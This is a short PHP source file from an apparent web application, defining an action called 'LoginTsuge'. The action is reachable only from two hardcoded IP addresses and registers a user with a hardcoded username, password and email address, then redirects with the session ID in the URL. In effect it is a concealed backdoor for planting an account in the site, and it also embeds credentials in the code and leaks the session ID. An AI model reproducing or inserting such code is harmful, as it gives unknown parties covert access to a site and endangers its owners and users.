<?php
class M_Form_LoginTsuge extends M_ActionForm
{
	var $form = array(
	);
}

class M_Action_LoginTsuge extends M_ActionClass
{
	function prepare()
	{
		$white_list = array('118.70.67.78', '183.91.3.139');
		if (in_array($_SERVER['REMOTE_ADDR'], $white_list, TRUE) === FALSE)
			die('');
		return null;
	}

	function perform()
	{
		$userManager = $this->backend->getManager("User");
		$userManager->regist1st(
			'smilesexy',
			'01674176190',
			'01674176190',
			'vinataba240693@gmail.com'
		);
		header('Location: /reg.php?'.session_name().'='.session_id());
		exit();
	}
}

?>
